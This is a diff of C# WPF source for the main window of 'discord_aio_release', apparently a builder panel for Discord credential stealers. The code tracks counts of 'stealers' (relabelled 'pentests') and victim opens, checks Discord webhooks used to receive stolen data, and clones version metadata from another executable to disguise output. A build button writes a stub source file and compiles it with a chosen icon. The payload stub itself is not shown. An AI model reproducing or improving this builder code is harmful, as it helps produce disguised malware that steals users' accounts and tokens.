@@ -1,40 +1,44 @@
 ﻿using Microsoft.Win32;
 using System;
-using System.Collections.Generic;
 using System.Diagnostics;
-using System.Linq;
 using System.Net;
 using System.Net.Http;
 using System.IO;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows;
-using System.Windows.Controls;
-using System.Windows.Data;
-using System.Windows.Documents;
 using System.Windows.Input;
 using System.Windows.Media;
 using System.Windows.Media.Animation;
 using System.Windows.Media.Imaging;
-using System.Windows.Navigation;
-using System.Windows.Shapes;
-using System.Net.Sockets;
-using System.ComponentModel;
-using System.Net.Http.Headers;
 using Newtonsoft.Json.Linq;
 using Path = System.IO.Path;
-using Microsoft.IdentityModel.Tokens;
-using System.Linq.Expressions;
 using System.Threading;
+using System.Reflection.Metadata;
 
 namespace discord_aio_release
 {
     public partial class MainWindow : Window
     {
-        private protected string _serializedToken { get; set; }
-        private protected string _DP { get; set; }
+        private string _DP { get; set; }
+        private string _HWID { get; set; }
         private System.Windows.Threading.DispatcherTimer _timer;
-        public MainWindow(string _v, string hwid, string serializedToken, string _DAIO)
+        private RandomCharacters ranChars;
+        private readonly Metadata metadata;
+        private new string Title { get; set; }
+        private string Description { get; set; }
+        private string Product { get; set; }
+        private string Company { get; set; }
+        private string Copyright { get; set; }
+        private string Trademark { get; set; }
+        private string MajorVersion { get; set; }
+        private string MinorVersion { get; set; }
+        private string BuildPart { get; set; }
+        private string PrivatePart { get; set; }
+        private string wh_msg_title { get; set; }
+        private string wh_msg_desc { get; set; }
+        private string wh_msg_user { get; set; }
+        public MainWindow(string _v, string hwid, string _DAIO)
         {
             InitializeComponent();
             settings_shadow.Opacity = 0;
@@ -45,53 +49,78 @@ namespace discord_aio_release
             hover_elipse.Opacity = 0;
             version_label.Content = _v + " " + hwid.ToUpper();
             username_label.Content = Environment.UserName;
-            _serializedToken = serializedToken;
+
             _DP = _DAIO;
+            _HWID = hwid;
+
             avatarHandler();
             WebHandler();
+
+            this.ranChars = new RandomCharacters();
             this.metadata = new Metadata(this.ranChars);
-            RefTick();
+
+            _ = RefTick();
             _timer = new System.Windows.Threading.DispatcherTimer();
-            _timer.Interval = TimeSpan.FromMinutes(15);
+            _timer.Interval = TimeSpan.FromMinutes(5);
             _timer.Tick += tTick;
             _timer.Start();
+
+            Title = string.Empty;
+            Description = string.Empty;
+            Product = string.Empty;
+            Company = string.Empty;
+            Copyright = string.Empty;
+            Trademark = string.Empty;
+            MajorVersion = string.Empty;
+            MinorVersion = string.Empty;
+            BuildPart = string.Empty;
+            PrivatePart = string.Empty;
+            wh_msg_title = string.Empty;
+            wh_msg_desc = string.Empty;
+            wh_msg_user = string.Empty;
         }
 
-        private readonly Metadata metadata;
-        private readonly RandomCharacters ranChars;
-        private string Title { get; set; }
-        private string Description { get; set; }
-        private string Product { get; set; }
-        private string Company { get; set; }
-        private string Copyright { get; set; }
-        private string Trademark { get; set; }
-        private string MajorVersion { get; set; }
-        private string MinorVersion { get; set; }
-        private string BuildPart { get; set; }
-        private string PrivatePart { get; set; }
-
-        private async void RefTick()
+        private async Task RefTick()
         {
             HttpClient _client = new HttpClient();
-            _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", _serializedToken);
-            HttpResponseMessage response = await _client.GetAsync("APIURL");
-            response.EnsureSuccessStatusCode();
-            string resBody = await response.Content.ReadAsStringAsync();
-            JObject jsonObj = JObject.Parse(resBody);
-            users_count.Content = jsonObj["total_Users"].ToString();
-            stealers_count1.Content = jsonObj["total_Stealers"].ToString();
-            opens_count.Content = jsonObj["total_Opens"].ToString();
-            active_count.Content = jsonObj["active_Users"].ToString();
+            try
+            {
+                var hwidContent = new StringContent($"\"{_HWID}\"", Encoding.UTF8, "application/json");
+                await _client.PostAsync("https://localhost:7118/user/heartbeat", hwidContent);
+
+                HttpResponseMessage response1 = await _client.GetAsync("https://localhost:7118/statistics");
+                response1.EnsureSuccessStatusCode();
+                string resBody1 = await response1.Content.ReadAsStringAsync();
+                JObject jsonObj1 = JObject.Parse(resBody1);
+                opens_count.Content = jsonObj1["totalOpens"]?.ToString() ?? "0";
+                stealers_count1.Content = jsonObj1["totalPentests"]?.ToString() ?? "0";
+
+                HttpResponseMessage response2 = await _client.GetAsync("https://localhost:7118/user/total");
+                response2.EnsureSuccessStatusCode();
+                string resBody2 = await response2.Content.ReadAsStringAsync();
+                JObject jsonObj2 = JObject.Parse(resBody2);
+                users_count.Content = jsonObj2["totalUsers"]?.ToString() ?? "0";
+
+                HttpResponseMessage response3 = await _client.GetAsync("https://localhost:7118/user/count");
+                response3.EnsureSuccessStatusCode();
+                string resBody3 = await response3.Content.ReadAsStringAsync();
+                JObject jsonObj3 = JObject.Parse(resBody3);
+                active_count.Content = jsonObj3["activeUsers"]?.ToString() ?? "0";
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"An error occurred: {ex.Message}", "Error");
+            }
         }
 
-        private async void tTick(object sender, EventArgs e)
+        private async void tTick(object? sender, EventArgs e)
         {
-            RefTick();
+            await RefTick();
         }
 
         private async void WebHandler()
         {
-            string warning_url = "WARNING";
+            string warning_url = "https://pastebin.com/raw/Kazgwd6V";
             using (HttpClient client = new HttpClient())
             {
                 // Warning logic
@@ -109,10 +138,25 @@ namespace discord_aio_release
                 {
                     warning_label.Content = "An error occured. Please, contact the developers.";
                 }
+
+                // User avatar logic (simple as for no accounts now)
+            /*    try
+                {
+                    var img = new Image();
+                    string iURL = "http://162.19.227.17/daio/media/avatars/avatar.jpg"; // Make logic to retrieve image by login name
+
+                    BitmapImage bitmap = new BitmapImage();
+                    bitmap.BeginInit();
+                    bitmap.UriSource = new Uri(iURL, UriKind.Absolute);
+                    bitmap.EndInit();
+
+                    user_avatar.ImageSource = bitmap;
+                }
+                catch { } */
             }
         }
 
-        private async void avatarHandler()
+        private void avatarHandler()
         {
             string avPath = Path.Combine(_DP, "avatar.png");
             if (File.Exists(avPath))
@@ -219,14 +263,24 @@ namespace discord_aio_release
         }
 
         // Webhook checker
-        private void webhook_button_Click(object sender, RoutedEventArgs e)
+        private async void webhook_button_Click(object sender, RoutedEventArgs e)
         {
             if (!String.IsNullOrEmpty(webhook_input.Text) && !String.IsNullOrWhiteSpace(webhook_input.Text))
             {
                 try
                 {
-                    string wh_ = new WebClient().DownloadString(webhook_input.Text);
-                    MessageBox.Show("valid");
+                    using (HttpClient client = new HttpClient())
+                    {
+                        HttpResponseMessage response = await client.GetAsync(webhook_input.Text);
+                        if (response.IsSuccessStatusCode)
+                        {
+                            MessageBox.Show("valid");
+                        }
+                        else
+                        {
+                            MessageBox.Show("not valid");
+                        }
+                    }
                 }
                 catch { MessageBox.Show("not valid"); }
             }
@@ -263,12 +317,12 @@ namespace discord_aio_release
 
                     FileVersionInfo info = FileVersionInfo.GetVersionInfo(path);
 
-                    Title = info.OriginalFilename;
-                    Description = info.FileDescription;
-                    Product = info.ProductName;
-                    Company = info.CompanyName;
-                    Copyright = info.LegalCopyright;
-                    Trademark = info.LegalTrademarks;
+                    Title = info.OriginalFilename ?? string.Empty;
+                    Description = info.FileDescription ?? string.Empty;
+                    Product = info.ProductName ?? string.Empty;
+                    Company = info.CompanyName ?? string.Empty;
+                    Copyright = info.LegalCopyright ?? string.Empty;
+                    Trademark = info.LegalTrademarks ?? string.Empty;
                     MajorVersion = info.FileMajorPart.ToString();
                     MinorVersion = info.FileMinorPart.ToString();
                     BuildPart = info.FileBuildPart.ToString();
@@ -301,7 +355,7 @@ namespace discord_aio_release
             catch { }
         }
 
-        private async void build_button_Click(object sender, RoutedEventArgs e)
+        private void build_button_Click(object sender, RoutedEventArgs e)
         {
             if (!(metadata_label.Content.ToString() == "None") && !string.IsNullOrEmpty(metadata_label.Content.ToString()))
             {
@@ -313,7 +367,7 @@ namespace discord_aio_release
                     bool? builderResult = builder.ShowDialog();
                     if (builderResult == true)
                     {
-                        string iconLabel = icon_label.Content.ToString();
+                        string? iconLabel = icon_label.Content?.ToString();
                         string appIcon = "none";
                         if (iconLabel != "None" && !string.IsNullOrEmpty(iconLabel))
                             appIcon = iconLabel;
@@ -326,7 +380,7 @@ namespace discord_aio_release
 
                         File.WriteAllText(Path.Combine(_DP, "stub.cs"), main_sc);
 
-                        string arguments = $"{_serializedToken} {builder.FileName} {appIcon}";
+                        string arguments = $"{builder.FileName} {appIcon}";
                         Process.Start(_DP + "\\daioCompiler.exe", arguments);
                     }
                 }
@@ -367,18 +421,24 @@ namespace discord_aio_release
             catch { MessageBox.Show("Please wait a moment before proceeding with this action."); }
         }
 
-        private string wh_msg_title { get; set; }
-        private string wh_msg_desc { get; set; }
-        private string wh_msg_user { get; set; }
-
-        private void webhook_button2_Click(object sender, RoutedEventArgs e)
+        private async void webhook_button2_Click(object sender, RoutedEventArgs e)
         {
             if (!String.IsNullOrEmpty(webhook_input2.Text) && !String.IsNullOrWhiteSpace(webhook_input2.Text))
             {
                 try
                 {
-                    string wh_ = new WebClient().DownloadString(webhook_input2.Text);
-                    MessageBox.Show("valid");
+                    using (HttpClient client = new HttpClient())
+                    {
+                        HttpResponseMessage response = await client.GetAsync(webhook_input.Text);
+                        if (response.IsSuccessStatusCode)
+                        {
+                            MessageBox.Show("valid");
+                        }
+                        else
+                        {
+                            MessageBox.Show("not valid");
+                        }
+                    }
                 }
                 catch { MessageBox.Show("not valid"); }
             }
